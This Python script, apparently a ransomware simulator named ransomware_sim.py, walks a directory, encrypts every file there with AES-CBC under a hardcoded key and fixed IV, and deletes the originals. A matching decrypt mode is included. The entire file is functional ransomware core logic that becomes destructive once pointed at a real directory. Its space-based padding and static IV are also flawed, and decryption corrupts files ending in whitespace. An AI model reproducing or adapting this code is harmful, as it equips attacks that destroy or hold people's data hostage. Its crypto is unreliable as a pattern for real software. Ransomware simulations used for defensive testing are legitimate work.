from Crypto.Cipher import AES
import os
import sys
import shutil

# AES encryption settings
KEY = b'Sixteen byte key'  # MUST be 16, 24, or 32 bytes
IV = b'This is an IV456'  # Initialization Vector

# Directory to encrypt/decrypt
target_directory = "test_folder"

def pad(data):
    return data + b" " * (16 - len(data) % 16)

def encrypt_file(file_path):
    """Encrypt a file using AES"""
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    ciphertext = cipher.encrypt(pad(plaintext))
    with open(file_path + ".enc", 'wb') as f:
        f.write(ciphertext)
    os.remove(file_path)  # Delete original file

def decrypt_file(file_path):
    """Decrypt a file using AES"""
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    with open(file_path, 'rb') as f:
        ciphertext = f.read()
    plaintext = cipher.decrypt(ciphertext).rstrip(b" ")
    original_path = file_path.replace(".enc", "")
    with open(original_path, 'wb') as f:
        f.write(plaintext)
    os.remove(file_path)  # Delete encrypted file

def process_files(action):
    """Encrypt or decrypt all files in the target directory"""
    if not os.path.exists(target_directory):
        print("[ERROR] Target directory not found!")
        return
    
    for root, _, files in os.walk(target_directory):
        for file in files:
            file_path = os.path.join(root, file)
            if action == "encrypt" and not file.endswith(".enc"):
                encrypt_file(file_path)
                print(f"[ENCRYPTED] {file_path}")
            elif action == "decrypt" and file.endswith(".enc"):
                decrypt_file(file_path)
                print(f"[DECRYPTED] {file_path}")

if __name__ == "__main__":
    if len(sys.argv) != 2 or sys.argv[1] not in ["encrypt", "decrypt"]:
        print("Usage: python ransomware_sim.py [encrypt|decrypt]")
        sys.exit(1)
    
    action = sys.argv[1]
    process_files(action)
